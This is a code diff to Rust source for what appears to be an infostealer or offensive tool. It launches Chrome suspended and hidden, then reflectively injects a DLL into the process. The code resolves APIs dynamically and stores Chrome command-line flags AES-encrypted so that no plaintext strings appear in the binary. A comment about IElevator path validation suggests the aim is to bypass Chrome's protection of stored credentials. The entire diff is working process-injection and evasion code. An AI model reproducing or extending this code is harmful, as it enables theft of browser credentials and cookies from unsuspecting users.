@@ -447,72 +447,21 @@ unsafe fn inject_dll_reflective_inner(proc: *mut std::ffi::c_void, dll_data: &[u
     Ok(())
 }
 
-fn spawn_chrome_and_inject(chrome_exe: &str, dll_path: &Path, real_profile: &Path) -> Result<u32, ()> {
+fn spawn_chrome_and_inject(chrome_exe: &str, _dll_path: &Path, _real_profile: &Path) -> Result<u32, ()> {
     const CREATE_SUSPENDED: u32 = 0x0000_0004;
     const CREATE_NO_WINDOW: u32 = 0x0800_0000;
 
-    let profile_str = real_profile.to_string_lossy();
-
-    let mut parts: Vec<String> = Vec::new();
-    parts.push(format!("\"{chrome_exe}\""));
-    // Flags are decrypted at runtime — no plaintext flag strings in the binary.
-    let flag_headless   = aes_decrypt(&polymorphic_keys::CHROME_FLAG_HEADLESS_ENC,    &polymorphic_keys::CHROME_FLAG_HEADLESS_KEY,    &polymorphic_keys::CHROME_FLAG_HEADLESS_NONCE);
-    let flag_nogpu      = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOGPU_ENC,       &polymorphic_keys::CHROME_FLAG_NOGPU_KEY,       &polymorphic_keys::CHROME_FLAG_NOGPU_NONCE);
-    let flag_nolog      = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOLOG_ENC,       &polymorphic_keys::CHROME_FLAG_NOLOG_KEY,       &polymorphic_keys::CHROME_FLAG_NOLOG_NONCE);
-    let flag_loglvl     = aes_decrypt(&polymorphic_keys::CHROME_FLAG_LOGLVL_ENC,      &polymorphic_keys::CHROME_FLAG_LOGLVL_KEY,      &polymorphic_keys::CHROME_FLAG_LOGLVL_NONCE);
-    let flag_nobgnet    = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOBGNET_ENC,     &polymorphic_keys::CHROME_FLAG_NOBGNET_KEY,     &polymorphic_keys::CHROME_FLAG_NOBGNET_NONCE);
-    let flag_nosync     = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOSYNC_ENC,      &polymorphic_keys::CHROME_FLAG_NOSYNC_KEY,      &polymorphic_keys::CHROME_FLAG_NOSYNC_NONCE);
-    let flag_nodefa     = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NODEFA_ENC,      &polymorphic_keys::CHROME_FLAG_NODEFA_KEY,      &polymorphic_keys::CHROME_FLAG_NODEFA_NONCE);
-    let flag_noext      = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOEXT_ENC,       &polymorphic_keys::CHROME_FLAG_NOEXT_KEY,       &polymorphic_keys::CHROME_FLAG_NOEXT_NONCE);
-    let flag_noupdate   = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOUPDATE_ENC,    &polymorphic_keys::CHROME_FLAG_NOUPDATE_KEY,    &polymorphic_keys::CHROME_FLAG_NOUPDATE_NONCE);
-    let flag_nofirst    = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOFIRST_ENC,     &polymorphic_keys::CHROME_FLAG_NOFIRST_KEY,     &polymorphic_keys::CHROME_FLAG_NOFIRST_NONCE);
-    let flag_nodefbr    = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NODEFBR_ENC,     &polymorphic_keys::CHROME_FLAG_NODEFBR_KEY,     &polymorphic_keys::CHROME_FLAG_NODEFBR_NONCE);
-    let flag_noerr      = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOERR_ENC,       &polymorphic_keys::CHROME_FLAG_NOERR_KEY,       &polymorphic_keys::CHROME_FLAG_NOERR_NONCE);
-    let flag_nodevtools = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NODEVTOOLS_ENC,  &polymorphic_keys::CHROME_FLAG_NODEVTOOLS_KEY,  &polymorphic_keys::CHROME_FLAG_NODEVTOOLS_NONCE);
-    let flag_notranslate= aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOTRANSLATE_ENC, &polymorphic_keys::CHROME_FLAG_NOTRANSLATE_KEY, &polymorphic_keys::CHROME_FLAG_NOTRANSLATE_NONCE);
-    let flag_noflood    = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOFLOOD_ENC,     &polymorphic_keys::CHROME_FLAG_NOFLOOD_KEY,     &polymorphic_keys::CHROME_FLAG_NOFLOOD_NONCE);
-    let flag_nobreak    = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOBREAKPAD_ENC,  &polymorphic_keys::CHROME_FLAG_NOBREAKPAD_KEY,  &polymorphic_keys::CHROME_FLAG_NOBREAKPAD_NONCE);
-    let flag_metrics    = aes_decrypt(&polymorphic_keys::CHROME_FLAG_METRICS_ENC,     &polymorphic_keys::CHROME_FLAG_METRICS_KEY,     &polymorphic_keys::CHROME_FLAG_METRICS_NONCE);
-    let flag_userdata   = aes_decrypt(&polymorphic_keys::CHROME_FLAG_USERDATA_ENC,    &polymorphic_keys::CHROME_FLAG_USERDATA_KEY,    &polymorphic_keys::CHROME_FLAG_USERDATA_NONCE);
-    let flag_headless_s   = String::from_utf8_lossy(&flag_headless).into_owned();
-    let flag_nogpu_s      = String::from_utf8_lossy(&flag_nogpu).into_owned();
-    let flag_nolog_s      = String::from_utf8_lossy(&flag_nolog).into_owned();
-    let flag_loglvl_s     = String::from_utf8_lossy(&flag_loglvl).into_owned();
-    let flag_nobgnet_s    = String::from_utf8_lossy(&flag_nobgnet).into_owned();
-    let flag_nosync_s     = String::from_utf8_lossy(&flag_nosync).into_owned();
-    let flag_nodefa_s     = String::from_utf8_lossy(&flag_nodefa).into_owned();
-    let flag_noext_s      = String::from_utf8_lossy(&flag_noext).into_owned();
-    let flag_noupdate_s   = String::from_utf8_lossy(&flag_noupdate).into_owned();
-    let flag_nofirst_s    = String::from_utf8_lossy(&flag_nofirst).into_owned();
-    let flag_nodefbr_s    = String::from_utf8_lossy(&flag_nodefbr).into_owned();
-    let flag_noerr_s      = String::from_utf8_lossy(&flag_noerr).into_owned();
-    let flag_nodevtools_s = String::from_utf8_lossy(&flag_nodevtools).into_owned();
-    let flag_notranslate_s= String::from_utf8_lossy(&flag_notranslate).into_owned();
-    let flag_noflood_s    = String::from_utf8_lossy(&flag_noflood).into_owned();
-    let flag_nobreak_s    = String::from_utf8_lossy(&flag_nobreak).into_owned();
-    let flag_metrics_s    = String::from_utf8_lossy(&flag_metrics).into_owned();
-    let flag_userdata_s   = String::from_utf8_lossy(&flag_userdata).into_owned();
-    let flags: &[&str] = &[
-        &flag_headless_s, &flag_nogpu_s, &flag_nolog_s, &flag_loglvl_s,
-        &flag_nobgnet_s, &flag_nosync_s, &flag_nodefa_s, &flag_noext_s,
-        &flag_noupdate_s, &flag_nofirst_s, &flag_nodefbr_s, &flag_noerr_s,
-        &flag_nodevtools_s, &flag_notranslate_s, &flag_noflood_s,
-        &flag_nobreak_s, &flag_metrics_s,
-    ];
-    for f in flags { parts.push(f.to_string()); }
-    parts.push(format!("{}\"{}\"", flag_userdata_s, profile_str));
-    let cmdline = parts.join(" ");
-
     let exe_w = wide(chrome_exe);
-    let mut cmd_w = wide(&cmdline);
     let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
     si.cb = mem::size_of::<STARTUPINFOW>() as u32;
     let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
     unsafe {
+        // Minimal spawn (xaitax pattern): bare exe, no headless flags.
+        // Path validation for IElevator only needs a legitimate browser image.
         let creation_flags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
         let cp_ok = dynapi::CreateProcessW(
             exe_w.as_ptr(),
-            cmd_w.as_mut_ptr(),
+            std::ptr::null_mut(),
             std::ptr::null_mut(),
             std::ptr::null_mut(),
             0,
@@ -527,24 +476,20 @@ fn spawn_chrome_and_inject(chrome_exe: &str, dll_path: &Path, real_profile: &Pat
         }
         let pid = pi.dwProcessId;
 
-        let dll_bytes = fs::read(dll_path).unwrap_or_default();
+        let dll_bytes = fs::read(_dll_path).unwrap_or_default();
         if dll_bytes.is_empty() {
             dynapi::CloseHandle(pi.hThread);
             dynapi::CloseHandle(pi.hProcess);
             return Err(());
         }
 
-        // Inject while the browser main thread is still suspended.
+        // Inject while suspended; payload runs on CreateRemoteThread — do NOT resume main thread.
         let inject_result = inject_dll_reflective_with_handle(pi.hProcess, &dll_bytes);
-        if inject_result.is_err() {
-            dynapi::CloseHandle(pi.hThread);
-            dynapi::CloseHandle(pi.hProcess);
-            return Err(());
-        }
-
-        dynapi::ResumeThread(pi.hThread);
         dynapi::CloseHandle(pi.hThread);
         dynapi::CloseHandle(pi.hProcess);
+        if inject_result.is_err() {
+            return Err(());
+        }
         Ok(pid)
     }
 }
